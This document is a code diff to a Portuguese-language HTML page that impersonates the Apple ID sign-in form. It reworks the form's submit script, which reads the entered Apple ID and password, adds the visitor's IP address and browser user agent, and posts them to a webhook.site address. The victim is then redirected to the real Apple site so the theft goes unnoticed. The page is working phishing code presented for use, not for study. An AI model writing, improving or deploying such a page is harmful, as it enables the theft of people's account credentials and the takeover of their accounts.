@@ -54,20 +54,6 @@
       text-align: center;
       margin-top: 10px;
     }
-    .loader {
-      border: 3px solid #f3f3f3;
-      border-top: 3px solid #0071e3;
-      border-radius: 50%;
-      width: 20px;
-      height: 20px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto;
-      display: none;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
   </style>
 </head>
 <body>
@@ -77,49 +63,39 @@
     <form id="loginForm">
       <input type="text" name="apple_id" placeholder="Apple ID" required>
       <input type="password" name="password" placeholder="Senha" required>
-      <button type="submit" id="submitBtn">Continuar</button>
-      <div class="loader" id="loader"></div>
+      <button type="submit">Continuar</button>
     </form>
   </div>
 
   <script>
     document.getElementById("loginForm").addEventListener("submit", async function(e) {
       e.preventDefault(); // Impede o envio padrão do formulário
-      const submitBtn = document.getElementById("submitBtn");
-      const loader = document.getElementById("loader");
 
-      // Mostra o loader e desativa o botão
-      submitBtn.style.display = "none";
-      loader.style.display = "block";
+      // Coleta os dados do formulário
+      const formData = {
+        apple_id: document.getElementsByName("apple_id")[0].value,
+        password: document.getElementsByName("password")[0].value,
+        ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
+        user_agent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+      };
 
-      try {
-        // Coleta metadados (IP, User-Agent)
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-
-        // Envia dados para o webhook (substitua SEU_WEBHOOK_AQUI)
-        await fetch('https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            apple_id: document.getElementsByName("apple_id")[0].value,
-            password: document.getElementsByName("password")[0].value,
-            ip: ipData.ip,
-            user_agent: navigator.userAgent,
-            timestamp: new Date().toISOString()
-          })
-        });
-
-        // Redireciona para a página oficial da Apple após 1.5s (tempo para garantir o envio)
-        setTimeout(() => {
+      // Envia os dados para o webhook (JÁ COM SEU LINK!)
+      fetch('https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(formData)
+      })
+      .then(response => {
+        if (response.ok) {
+          // Redireciona para o site real da Apple após o envio
           window.location.href = "https://appleid.apple.com/";
-        }, 1500);
-
-      } catch (error) {
+        }
+      })
+      .catch(error => {
         console.error("Erro ao enviar dados:", error);
-        // Fallback: Redireciona mesmo se o webhook falhar
-        window.location.href = "https://appleid.apple.com/";
-      }
+        window.location.href = "https://appleid.apple.com/"; // Redireciona mesmo se falhar
+      });
     });
   </script>
 </body>
